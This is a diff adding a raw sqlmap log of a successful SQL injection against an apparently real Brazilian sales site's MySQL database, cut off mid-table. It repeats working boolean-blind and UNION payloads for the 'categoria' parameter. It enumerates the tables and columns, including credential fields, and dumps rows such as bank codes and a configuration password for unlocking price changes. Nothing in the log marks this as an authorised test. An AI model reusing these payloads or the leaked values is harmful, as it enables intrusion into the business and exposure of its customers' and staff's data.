@@ -1,0 +1,1657 @@
+sqlmap identified the following injection point(s) with a total of 90 HTTP(s) requests:
+---
+Parameter: categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: categoria=19 AND 7803=7803
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 30 columns
+    Payload: categoria=19 UNION ALL SELECT CONCAT(0x717a717171,0x5057756a5252666443544b7749434558494a4e5a6263617a6447506f444451636e7a795256707170,0x716b6b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VTtC
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.4.45, Apache
+back-end DBMS: MySQL >= 5.0.0
+banner: '5.6.35-81.0-log'
+current user is DBA: False
+available databases [2]:
+[*] information_schema
+[*] silvasartesana3
+
+Database: silvasartesana3
+[46 tables]
++---------------------------------------+
+| auditoria                             |
+| bancos                                |
+| bloqueios                             |
+| bloqueios_paginas                     |
+| boletos                               |
+| carrinhoab                            |
+| categorias                            |
+| clientes                              |
+| codbarras                             |
+| configs                               |
+| cupons                                |
+| emails                                |
+| emailvisualizacoes                    |
+| estados                               |
+| filtros                               |
+| filtros_produtos                      |
+| firma                                 |
+| fpgto                                 |
+| historico                             |
+| mkt_cliqueslink                       |
+| mkt_visualizacoes                     |
+| newinicial                            |
+| orcamentos                            |
+| orcamentositens                       |
+| produtos                              |
+| produtos2                             |
+| produtos_combos                       |
+| promocoes                             |
+| promoenviadas                         |
+| receber                               |
+| regiao0                               |
+| setores                               |
+| transportadoras                       |
+| usuarios                              |
+| vendas                                |
+| vendas_origem                         |
+| vendas_tipos                          |
+| vendascotacao                         |
+| vendasdetalhes                        |
+| vendasexpedicao                       |
+| vendasitens                           |
+| vendedores                            |
+| vorcamentositens                      |
+| vorcamentost                          |
+| vvendasitens                          |
+| vvendast                              |
++---------------------------------------+
+
+Database: information_schema
+[72 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| CLIENT_STATISTICS                     |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_TEMPORARY_TABLES               |
+| GLOBAL_VARIABLES                      |
+| INDEX_STATISTICS                      |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CHANGED_PAGES                  |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_METRICS                        |
+| INNODB_SYS_COLUMNS                    |
+| INNODB_SYS_DATAFILES                  |
+| INNODB_SYS_FIELDS                     |
+| INNODB_SYS_FOREIGN                    |
+| INNODB_SYS_FOREIGN_COLS               |
+| INNODB_SYS_INDEXES                    |
+| INNODB_SYS_TABLES                     |
+| INNODB_SYS_TABLESPACES                |
+| INNODB_SYS_TABLESTATS                 |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| OPTIMIZER_TRACE                       |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TABLE_STATISTICS                      |
+| TEMPORARY_TABLES                      |
+| THREAD_STATISTICS                     |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| USER_STATISTICS                       |
+| VIEWS                                 |
+| XTRADB_INTERNAL_HASH_TABLES           |
+| XTRADB_READ_VIEW                      |
+| XTRADB_RSEG                           |
+| XTRADB_ZIP_DICT                       |
+| XTRADB_ZIP_DICT_COLS                  |
++---------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: categoria=19 AND 7803=7803
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 30 columns
+    Payload: categoria=19 UNION ALL SELECT CONCAT(0x717a717171,0x5057756a5252666443544b7749434558494a4e5a6263617a6447506f444451636e7a795256707170,0x716b6b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VTtC
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.4.45, Apache
+back-end DBMS: MySQL 5
+Database: silvasartesana3
+[46 tables]
++--------------------+
+| auditoria          |
+| bancos             |
+| bloqueios          |
+| bloqueios_paginas  |
+| boletos            |
+| carrinhoab         |
+| categorias         |
+| clientes           |
+| codbarras          |
+| configs            |
+| cupons             |
+| emails             |
+| emailvisualizacoes |
+| estados            |
+| filtros            |
+| filtros_produtos   |
+| firma              |
+| fpgto              |
+| historico          |
+| mkt_cliqueslink    |
+| mkt_visualizacoes  |
+| newinicial         |
+| orcamentos         |
+| orcamentositens    |
+| produtos           |
+| produtos2          |
+| produtos_combos    |
+| promocoes          |
+| promoenviadas      |
+| receber            |
+| regiao0            |
+| setores            |
+| transportadoras    |
+| usuarios           |
+| vendas             |
+| vendas_origem      |
+| vendas_tipos       |
+| vendascotacao      |
+| vendasdetalhes     |
+| vendasexpedicao    |
+| vendasitens        |
+| vendedores         |
+| vorcamentositens   |
+| vorcamentost       |
+| vvendasitens       |
+| vvendast           |
++--------------------+
+
+Database: silvasartesana3
+Table: auditoria
+[1 entry]
++----+-----------+-----------+-------------+---------------------+--------+--------------------------------+----------------------------------------------------------------------------------------+--------------------+
+| id | idproduto | idcliente | idusuário   | data                | motivo | informacaotela                 | antesalteracao                                                                         | depoisalteracao    |
++----+-----------+-----------+-------------+---------------------+--------+--------------------------------+----------------------------------------------------------------------------------------+--------------------+
+| 4  | 0         | 6869      | 24          | 2019-01-14 13:34:00 | Consulta do gráfico de receber | Documento Excluido: 11645/3 | Valor: R$ 82,21 | Pago: R$ 0,00 | Vencimento: 02/01/2018 | Documento Excluido |
++----+-----------+-----------+-------------+---------------------+--------+--------------------------------+----------------------------------------------------------------------------------------+--------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: categoria=19 AND 7803=7803
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 30 columns
+    Payload: categoria=19 UNION ALL SELECT CONCAT(0x717a717171,0x5057756a5252666443544b7749434558494a4e5a6263617a6447506f444451636e7a795256707170,0x716b6b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VTtC
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.4.45, Apache
+back-end DBMS: MySQL 5
+banner: '5.6.35-81.0-log'
+current user is DBA: False
+available databases [2]:
+[*] information_schema
+[*] silvasartesana3
+
+Database: silvasartesana3
+[46 tables]
++---------------------------------------+
+| auditoria                             |
+| bancos                                |
+| bloqueios                             |
+| bloqueios_paginas                     |
+| boletos                               |
+| carrinhoab                            |
+| categorias                            |
+| clientes                              |
+| codbarras                             |
+| configs                               |
+| cupons                                |
+| emails                                |
+| emailvisualizacoes                    |
+| estados                               |
+| filtros                               |
+| filtros_produtos                      |
+| firma                                 |
+| fpgto                                 |
+| historico                             |
+| mkt_cliqueslink                       |
+| mkt_visualizacoes                     |
+| newinicial                            |
+| orcamentos                            |
+| orcamentositens                       |
+| produtos                              |
+| produtos2                             |
+| produtos_combos                       |
+| promocoes                             |
+| promoenviadas                         |
+| receber                               |
+| regiao0                               |
+| setores                               |
+| transportadoras                       |
+| usuarios                              |
+| vendas                                |
+| vendas_origem                         |
+| vendas_tipos                          |
+| vendascotacao                         |
+| vendasdetalhes                        |
+| vendasexpedicao                       |
+| vendasitens                           |
+| vendedores                            |
+| vorcamentositens                      |
+| vorcamentost                          |
+| vvendasitens                          |
+| vvendast                              |
++---------------------------------------+
+
+Database: information_schema
+[72 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| CLIENT_STATISTICS                     |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_TEMPORARY_TABLES               |
+| GLOBAL_VARIABLES                      |
+| INDEX_STATISTICS                      |
+| INNODB_BUFFER_PAGE                    |
+| INNODB_BUFFER_PAGE_LRU                |
+| INNODB_BUFFER_POOL_STATS              |
+| INNODB_CHANGED_PAGES                  |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_PER_INDEX                  |
+| INNODB_CMP_PER_INDEX_RESET            |
+| INNODB_CMP_RESET                      |
+| INNODB_FT_BEING_DELETED               |
+| INNODB_FT_CONFIG                      |
+| INNODB_FT_DEFAULT_STOPWORD            |
+| INNODB_FT_DELETED                     |
+| INNODB_FT_INDEX_CACHE                 |
+| INNODB_FT_INDEX_TABLE                 |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_METRICS                        |
+| INNODB_SYS_COLUMNS                    |
+| INNODB_SYS_DATAFILES                  |
+| INNODB_SYS_FIELDS                     |
+| INNODB_SYS_FOREIGN                    |
+| INNODB_SYS_FOREIGN_COLS               |
+| INNODB_SYS_INDEXES                    |
+| INNODB_SYS_TABLES                     |
+| INNODB_SYS_TABLESPACES                |
+| INNODB_SYS_TABLESTATS                 |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| OPTIMIZER_TRACE                       |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TABLE_STATISTICS                      |
+| TEMPORARY_TABLES                      |
+| THREAD_STATISTICS                     |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| USER_STATISTICS                       |
+| VIEWS                                 |
+| XTRADB_INTERNAL_HASH_TABLES           |
+| XTRADB_READ_VIEW                      |
+| XTRADB_RSEG                           |
+| XTRADB_ZIP_DICT                       |
+| XTRADB_ZIP_DICT_COLS                  |
++---------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: categoria=19 AND 7803=7803
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 30 columns
+    Payload: categoria=19 UNION ALL SELECT CONCAT(0x717a717171,0x5057756a5252666443544b7749434558494a4e5a6263617a6447506f444451636e7a795256707170,0x716b6b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VTtC
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.4.45, Apache
+back-end DBMS: MySQL 5
+Database: silvasartesana3
+Table: configs
+[2 entries]
++-----------------------------------------------------+-------+--------+------------------------------------------------------+
+| cvaloresvalidos                                     | ncodi | valor  | cdescricao                                           |
++-----------------------------------------------------+-------+--------+------------------------------------------------------+
+| Digite letras ou números para a senha               | 1     | 435600 | Senha usada para liberar alteração de preço e fração |
+| Percentual referente ao total de vendas no mes em % | 2     | 5      | Percentual de desconto permitido ao vendedor         |
++-----------------------------------------------------+-------+--------+------------------------------------------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: categoria=19 AND 7803=7803
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 30 columns
+    Payload: categoria=19 UNION ALL SELECT CONCAT(0x717a717171,0x5057756a5252666443544b7749434558494a4e5a6263617a6447506f444451636e7a795256707170,0x716b6b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VTtC
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.4.45, Apache
+back-end DBMS: MySQL 5
+Database: silvasartesana3
+Table: bancos
+[13 entries]
++----+----------------------+--------+
+| id | nome                 | codigo |
++----+----------------------+--------+
+| 4  | BANCO DO BRASIL      | 333    |
+| 5  | SILVAS CEF           | 444    |
+| 6  | *                    | 557    |
+| 7  | ***CHEQUE***         | 556    |
+| 8  | ***NãO USAR ADRIANO  | 111    |
+| 9  | ARQUIVADO FALTA DOC  | 110    |
+| 10 | BANCO DO BRASIL      | 1      |
+| 11 | CARTAO DE CREDITO    | 558    |
+| 12 | DEPOSITO EM CONTA    | 440    |
+| 13 | FORNECEDORES         | 550    |
+| 14 | GUSTAVO              | 222    |
+| 15 | INDEFINIDO           | 220    |
+| 16 | NEGATIVADO - SERASA  | 555    |
++----+----------------------+--------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: categoria=19 AND 7803=7803
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 30 columns
+    Payload: categoria=19 UNION ALL SELECT CONCAT(0x717a717171,0x5057756a5252666443544b7749434558494a4e5a6263617a6447506f444451636e7a795256707170,0x716b6b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VTtC
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.4.45, Apache
+back-end DBMS: MySQL 5
+Database: silvasartesana3
+Table: vendas
+[39 columns]
++----------------------+------------------+
+| Column               | Type             |
++----------------------+------------------+
+| btransferida         | int(1) unsigned  |
+| cbairroEntrega       | varchar(45)      |
+| ccepEntrega          | varchar(10)      |
+| ccidadeEntrega       | varchar(55)      |
+| ccompEntrega         | varchar(45)      |
+| ccontato             | varchar(65)      |
+| ccupom               | varchar(45)      |
+| cendEntrega          | varchar(85)      |
+| cestadoEntrega       | varchar(45)      |
+| cimgStatus           | varchar(95)      |
+| cmotivoReprova       | varchar(45)      |
+| cobs                 | text             |
+| cobsInterna          | text             |
+| ddata                | datetime         |
+| ddataaval            | datetime         |
+| descontoitens        | decimal(12,2)    |
+| descontovendedor     | decimal(12,2)    |
+| lanalise             | tinyint(1)       |
+| laprovadaFin         | tinyint(1)       |
+| lavalvendedor        | tinyint(1)       |
+| lcancela             | tinyint(1)       |
+| lentregue            | tinyint(1)       |
+| limprimiu            | tinyint(1)       |
+| ncodcliente          | int(6) unsigned  |
+| ncodvendedor         | int(6) unsigned  |
+| ncondpgto            | int(2) unsigned  |
+| ndescontocupom       | decimal(7,2)     |
+| nnupd                | int(9) unsigned  |
+| nnupdcacau           | int(10) unsigned |
+| nota                 | varchar(45)      |
+| npgtofrete           | int(2) unsigned  |
+| nvalordesconto       | decimal(7,2)     |
+| nvalordescontoavista | decimal(7,2)     |
+| nvalortaxa           | decimal(7,2)     |
+| nvalortotal          | decimal(12,2)    |
+| origem               | int(2)           |
+| tipo                 | int(2)           |
+| transportadora       | int(10)          |
+| transportadora2      | int(10) unsigned |
++----------------------+------------------+
+
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: categoria (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: categoria=19 AND 7803=7803
+    Vector: AND [INFERENCE]
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 30 columns
+    Payload: categoria=19 UNION ALL SELECT CONCAT(0x717a717171,0x5057756a5252666443544b7749434558494a4e5a6263617a6447506f444451636e7a795256707170,0x716b6b7171),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- VTtC
+    Vector:  UNION ALL SELECT [QUERY],NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL[GENERIC_SQL_COMMENT]
+---
+web application technology: PHP 5.4.45, Apache
+back-end DBMS: MySQL 5
+Database: silvasartesana3
+[46 tables]
++--------------------+
+| auditoria          |
+| bancos             |
+| bloqueios          |
+| bloqueios_paginas  |
+| boletos            |
+| carrinhoab         |
+| categorias         |
+| clientes           |
+| codbarras          |
+| configs            |
+| cupons             |
+| emails             |
+| emailvisualizacoes |
+| estados            |
+| filtros            |
+| filtros_produtos   |
+| firma              |
+| fpgto              |
+| historico          |
+| mkt_cliqueslink    |
+| mkt_visualizacoes  |
+| newinicial         |
+| orcamentos         |
+| orcamentositens    |
+| produtos           |
+| produtos2          |
+| produtos_combos    |
+| promocoes          |
+| promoenviadas      |
+| receber            |
+| regiao0            |
+| setores            |
+| transportadoras    |
+| usuarios           |
+| vendas             |
+| vendas_origem      |
+| vendas_tipos       |
+| vendascotacao      |
+| vendasdetalhes     |
+| vendasexpedicao    |
+| vendasitens        |
+| vendedores         |
+| vorcamentositens   |
+| vorcamentost       |
+| vvendasitens       |
+| vvendast           |
++--------------------+
+
+Database: silvasartesana3
+Table: vendasitens
+[9 columns]
++-------------+-----------------+
+| Column      | Type            |
++-------------+-----------------+
+| bcombo      | tinyint(1)      |
+| cvolume     | varchar(99)     |
+| ncodpro     | int(5) unsigned |
+| ndesconto   | decimal(4,2)    |
+| nitem       | int(3) unsigned |
+| nnupd       | int(9) unsigned |
+| npreco      | decimal(7,2)    |
+| nquantidade | decimal(7,3)    |
+| seditado    | varchar(2)      |
++-------------+-----------------+
+
+Database: silvasartesana3
+Table: vendedores
+[9 columns]
++------------+------------------+
+| Column     | Type             |
++------------+------------------+
+| cemail     | varchar(85)      |
+| cnome      | varchar(55)      |
+| cregiao    | varchar(5)       |
+| csenha     | varchar(65)      |
+| cusuario   | varchar(45)      |
+| lexterno   | tinyint(4)       |
+| linativo   | tinyint(1)       |
+| lindicador | varchar(1)       |
+| ncodi      | int(10) unsigned |
++------------+------------------+
+
+Database: silvasartesana3
+Table: vorcamentost
+[41 columns]
++----------------------+------------------+
+| Column               | Type             |
++----------------------+------------------+
+| cbairroentrega       | varchar(45)      |
+| ccelular             | varchar(20)      |
+| ccepentrega          | varchar(10)      |
+| ccidadeentrega       | varchar(55)      |
+| ccompentrega         | varchar(45)      |
+| ccontato             | varchar(65)      |
+| ccupom               | varchar(45)      |
+| cendentrega          | varchar(85)      |
+| cestadoentrega       | varchar(45)      |
+| cforma               | varchar(45)      |
+| cimgstatus           | varchar(95)      |
+| cnpjCliente          | varchar(18)      |
+| cobs                 | varchar(350)     |
+| codCliente           | int(5) unsigned  |
+| codForma             | int(10) unsigned |
+| codVendedor          | int(10) unsigned |
+| crazao               | varchar(65)      |
+| ctelcliente          | varchar(90)      |
+| ddata                | datetime         |
+| descontoitens        | decimal(12,2)    |
+| descontovendedor     | decimal(12,2)    |
+| descricaoorigem      | varchar(100)     |
+| descricaotipo        | varchar(100)     |
+| emailCliente         | varchar(95)      |
+| emailVendedor        | varchar(85)      |
+| idorigem             | int(11)          |
+| idtipo               | int(11)          |
+| lavalvendedor        | tinyint(1)       |
+| lcancela             | tinyint(1)       |
+| lentregue            | tinyint(1)       |
+| ndescontocupom       | decimal(7,2)     |
+| nnumvenda            | int(10) unsigned |
+| nnupd                | int(9) unsigned  |
+| nomeCliente          | varchar(65)      |
+| nomeVendedor         | varchar(55)      |
+| nota                 | varchar(45)      |
+| nvalordesconto       | decimal(7,2)     |
+| nvalordescontoavista | decimal(7,2)     |
+| nvalortaxa           | decimal(7,2)     |
+| nvalortotal          | decimal(12,2)    |
+| obsinterna           | varchar(350)     |
++----------------------+------------------+
+
+Database: silvasartesana3
+Table: produtos2
+[23 columns]
++---------------------+------------------+
+| Column              | Type             |
++---------------------+------------------+
+| bcombo              | tinyint(1)       |
+| cCaracteristica     | varchar(45)      |
+| cimagemproduto      | varchar(65)      |
+| cnome               | varchar(75)      |
+| id_produtos         | int(10) unsigned |
+| lativo              | tinyint(1)       |
+| lbrinde             | tinyint(1)       |
+| lvinculouitem       | tinyint(1)       |
+| ncodi               | int(10) unsigned |
+| ndesconto           | decimal(7,2)     |
+| nfracao             | int(10) unsigned |
+| nitemvinculado      | int(10) unsigned |
+| npreco0             | decimal(6,2)     |
+| nprecoA             | decimal(6,2)     |
+| nprecoB             | decimal(6,2)     |
+| nprecoC             | decimal(6,2)     |
+| nprecoES            | decimal(6,2)     |
+| nprecoNE            | decimal(6,2)     |
+| nprecoNO            | decimal(6,2)     |
+| nprecoPadrao        | decimal(6,2)     |
+| nqtdofertada        | int(10) unsigned |
+| ntotalcompra        | decimal(8,2)     |
+| nvaloritemvinculado | decimal(8,2)     |
++---------------------+------------------+
+
+Database: silvasartesana3
+Table: vendasexpedicao
+[20 columns]
++---------+------------------+
+| Column  | Type             |
++---------+------------------+
+| nnupd   | int(10) unsigned |
+| peso1   | varchar(45)      |
+| peso2   | varchar(45)      |
+| peso3   | varchar(45)      |
+| peso4   | varchar(45)      |
+| peso5   | varchar(45)      |
+| peso6   | varchar(45)      |
+| peso7   | varchar(45)      |
+| peso8   | varchar(45)      |
+| peso9   | varchar(45)      |
+| volume  | varchar(45)      |
+| volume1 | varchar(45)      |
+| volume2 | varchar(45)      |
+| volume3 | varchar(45)      |
+| volume4 | varchar(45)      |
+| volume5 | varchar(45)      |
+| volume6 | varchar(45)      |
+| volume7 | varchar(45)      |
+| volume8 | varchar(45)      |
+| volume9 | varchar(45)      |
++---------+------------------+
+
+Database: silvasartesana3
+Table: auditoria
+[13 columns]
++-----------------+--------------+
+| Column          | Type         |
++-----------------+--------------+
+| idusuário       | int(11)      |
+| antesalteracao  | varchar(240) |
+| data            | datetime     |
+| depoisalteracao | varchar(240) |
+| id              | int(11)      |
+| idcliente       | int(11)      |
+| idproduto       | int(11)      |
+| informacaotela  | varchar(95)  |
+| motivo          | varchar(150) |
+| nomeusuario     | varchar(20)  |
+| numdoc          | varchar(20)  |
+| telaalterada    | varchar(55)  |
+| tipo            | varchar(65)  |
++-----------------+--------------+
+
+Database: silvasartesana3
+Table: mkt_cliqueslink
+[5 columns]
++----------+--------------+
+| Column   | Type         |
++----------+--------------+
+| campanha | varchar(95)  |
+| data     | varchar(20)  |
+| email    | varchar(95)  |
+| id       | int(11)      |
+| link     | varchar(200) |
++----------+--------------+
+
+Database: silvasartesana3
+Table: produtos_combos
+[4 columns]
++--------+------------------+
+| Column | Type             |
++--------+------------------+
+| id     | int(10) unsigned |
+| ncodi  | int(10) unsigned |
+| npreco | decimal(7,2)     |
+| nqtde  | int(10) unsigned |
++--------+------------------+
+
+Database: silvasartesana3
+Table: codbarras
+[3 columns]
++----------+-------------+
+| Column   | Type        |
++----------+-------------+
+| CBARRAS  | varchar(14) |
+| lalterar | tinyint(4)  |
+| NCODI    | bigint(14)  |
++----------+-------------+
+
+Database: silvasartesana3
+Table: filtros_produtos
+[2 columns]
++-----------+------------------+
+| Column    | Type             |
++-----------+------------------+
+| idfiltro  | int(10) unsigned |
+| idProduto | int(10) unsigned |
++-----------+------------------+
+
+Database: silvasartesana3
+Table: vendasdetalhes
+[4 columns]
++----------+-----------------+
+| Column   | Type            |
++----------+-----------------+
+| dvdLundi | date            |
+| nnupd    | int(9) unsigned |
+| npdLundi | bigint(10)      |
+| nvdLundi | bigint(10)      |
++----------+-----------------+
+
+Database: silvasartesana3
+Table: bloqueios_paginas
+[4 columns]
++------------+------------------+
+| Column     | Type             |
++------------+------------------+
+| id         | int(10) unsigned |
+| idmenu     | int(11)          |
+| informacao | varchar(200)     |
+| nome       | varchar(45)      |
++------------+------------------+
+
+Database: silvasartesana3
+Table: vvendast
+[44 columns]
++----------------------+------------------+
+| Column               | Type             |
++----------------------+------------------+
+| cbairroentrega       | varchar(45)      |
+| ccelular             | varchar(20)      |
+| ccepentrega          | varchar(10)      |
+| ccidadeentrega       | varchar(55)      |
+| ccompentrega         | varchar(45)      |
+| ccontato             | varchar(65)      |
+| ccupom               | varchar(45)      |
+| cendentrega          | varchar(85)      |
+| cestadoentrega       | varchar(45)      |
+| cforma               | varchar(45)      |
+| cimgstatus           | varchar(95)      |
+| cnometrans           | varchar(45)      |
+| cnpjCliente          | varchar(18)      |
+| cobs                 | text             |
+| codCliente           | int(5) unsigned  |
+| codForma             | int(10) unsigned |
+| codVendedor          | int(10) unsigned |
+| crazao               | varchar(65)      |
+| csitetrans           | varchar(85)      |
+| ctelcliente          | varchar(90)      |
+| ddata                | datetime         |
+| descontoitens        | decimal(12,2)    |
+| descontovendedor     | decimal(12,2)    |
+| descricaoorigem      | varchar(100)     |
+| descricaotipo        | varchar(100)     |
+| emailCliente         | varchar(95)      |
+| emailVendedor        | varchar(85)      |
+| idorigem             | int(11)          |
+| idtipo               | int(11)          |
+| lavalvendedor        | tinyint(1)       |
+| lcancela             | tinyint(1)       |
+| lentregue            | tinyint(1)       |
+| ncodiTransp          | int(10) unsigned |
+| ndescontocupom       | decimal(7,2)     |
+| nnupd                | int(9) unsigned  |
+| nnupdcacau           | int(10) unsigned |
+| nomeCliente          | varchar(65)      |
+| nomeVendedor         | varchar(55)      |
+| nota                 | varchar(45)      |
+| nvalordesconto       | decimal(7,2)     |
+| nvalordescontoavista | decimal(7,2)     |
+| nvalortaxa           | decimal(7,2)     |
+| nvalortotal          | decimal(12,2)    |
+| obsinterna           | text             |
++----------------------+------------------+
+
+Database: silvasartesana3
+Table: firma
+[7 columns]
++------------+------------------+
+| Column     | Type             |
++------------+------------------+
+| ccnpj      | varchar(18)      |
+| cinscricao | varchar(20)      |
+| cnome      | varchar(45)      |
+| csenha     | varchar(80)      |
+| cusuario   | varchar(20)      |
+| lindicador | varchar(1)       |
+| ncodi      | int(10) unsigned |
++------------+------------------+
+
+Database: silvasartesana3
+Table: newinicial
+[5 columns]
++-----------+------------------+
+| Column    | Type             |
